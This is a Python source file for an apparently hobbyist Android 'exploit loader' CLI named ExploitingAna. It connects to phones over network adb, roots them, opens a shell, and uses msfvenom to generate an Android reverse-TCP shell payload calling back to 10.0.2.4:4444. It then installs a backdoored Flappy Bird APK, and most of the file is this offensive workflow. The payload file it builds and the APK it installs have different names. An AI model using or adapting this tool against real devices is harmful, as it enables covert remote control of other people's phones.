from ast import main
from pickle import TRUE
import uiautomator, os, sys, time
from uiautomator import Device

class exploit():
    def list_devices(self):
        os.system('adb devices | tee device_list.txt')

    def root_access(self):
        os.system('adb root')

    def connect(self):
        ip = input('Select a Mobile IP from the list :')
        os.system(f'adb connect {ip}:5555')

    def disconnect_all(self):
        os.system('adb disconnect')

    def get_shell(self):
        os.system(f'adb shell')

    def install_apk(self):
        device = input('Select a Mobile IP from the list : ')
        path = input(f'({device})->Path of the file: ')
        os.system(f'adb -s {device} install {path}')

    def venom(self):
        os.system('msfvenom -a android -p android/shell/reverse_tcp LHOST=10.0.2.4 LPORT=4444 R > android_shell.apk')

def Ana_detect():
    exploit().list_devices()
    resultfile = open('device_list.txt', 'a+')
    result = resultfile.readlines()
    resultfile.close()
    if result != '':
        for i in range(len(result)):
            found_device = result[i].split(' ')
            print('Connected Device:',found_device)
    else:
        print('NO DEVICE FOUND!!')

def Ana_version():
    exp = exploit()
    exp.connect()
    os.system(f'adb shell getprop ro.build.version.release')
    
def Ana_sHell():
    exp = exploit()
    exp.connect()
    exp.root_access()
    print('Please dont break me ;_;')
    print('You have shell access for the Device!')
    exp.get_shell()

def Ana_exploit():
    exp = exploit()
    exp.connect()
    exp.venom()
    os.system('adb install -r flappy_bird_backdoored.apk')


def cli_display1():
    print("""\
   ▄████████ ▀████    ▐████▀    ▄███████▄  ▄█        ▄██████▄   ▄█      ███      ▄█  ███▄▄▄▄      ▄██████▄  
  ███    ███   ███▌   ████▀    ███    ███ ███       ███    ███ ███  ▀█████████▄ ███  ███▀▀▀██▄   ███    ███ 
  ███    █▀     ███  ▐███      ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ ███▌ ███   ███   ███    █▀  
 ▄███▄▄▄        ▀███▄███▀      ███    ███ ███       ███    ███ ███▌     ███   ▀ ███▌ ███   ███  ▄███        
▀▀███▀▀▀        ████▀██▄     ▀█████████▀  ███       ███    ███ ███▌     ███     ███▌ ███   ███ ▀▀███ ████▄  
  ███    █▄    ▐███  ▀███      ███        ███       ███    ███ ███      ███     ███  ███   ███   ███    ███ 
  ███    ███  ▄███     ███▄    ███        ███▌    ▄ ███    ███ ███      ███     ███  ███   ███   ███    ███ 
  ██████████ ████       ███▄  ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   █▀    ▀█   █▀    ████████▀  
                                          ▀                                                                 
        ▄████████ ███▄▄▄▄      ▄████████  ▄████████    ▄█    █▄       ▄████████ ███▄▄▄▄                     
       ███    ███ ███▀▀▀██▄   ███    ███ ███    ███   ███    ███     ███    ███ ███▀▀▀██▄                   
       ███    ███ ███   ███   ███    ███ ███    █▀    ███    ███     ███    ███ ███   ███                   
       ███    ███ ███   ███   ███    ███ ███         ▄███▄▄▄▄███▄▄   ███    ███ ███   ███                   
     ▀███████████ ███   ███ ▀███████████ ███        ▀▀███▀▀▀▀███▀  ▀███████████ ███   ███                   
       ███    ███ ███   ███   ███    ███ ███    █▄    ███    ███     ███    ███ ███   ███                   
       ███    ███ ███   ███   ███    ███ ███    ███   ███    ███     ███    ███ ███   ███                   
       ███    █▀   ▀█   █▀    ███    █▀  ████████▀    ███    █▀      ███    █▀   ▀█   █▀                    
                                                                                                            
""")
    print("+ -- --=[ExploitingAna v1.4]")
    print("+ -- --=[Android exploit loader. This project revolves around a python program that can detect, load and exploit vulnerable versions of Android.]")
    print("+ -- --=[https://github.com/SanWatty/ExploitingAnaChan]")
    print('\n')

def clidisplay2():
    print('Options:')
    print('1. Detect connected Android devices')
    print('2. Detect the version of Android devices')
    print('3. Get Shell Access')
    print('4. Try Exploit for the Android')
    print('5. Get me out of here!')

def main():
    cli_display1()

    if __name__ == '__main__':
            clidisplay2()

            op = int(input('Enter your choice: '))
        
            if op >=1 and op <= 5:
                if op == 1:
                    Ana_detect()
                    main()
                elif op == 2:
                    Ana_version()
                    main()
                elif op == 3: 
                    Ana_sHell()
                    main()
                elif op == 4:
                    Ana_exploit()
                    main()
                elif op == 5:
                    print("Closing program... Hope you had fun exploiting AnaChan :3")
                    exit()
            else:
                print("Error value, try again. program restarting...")
                main()

main()         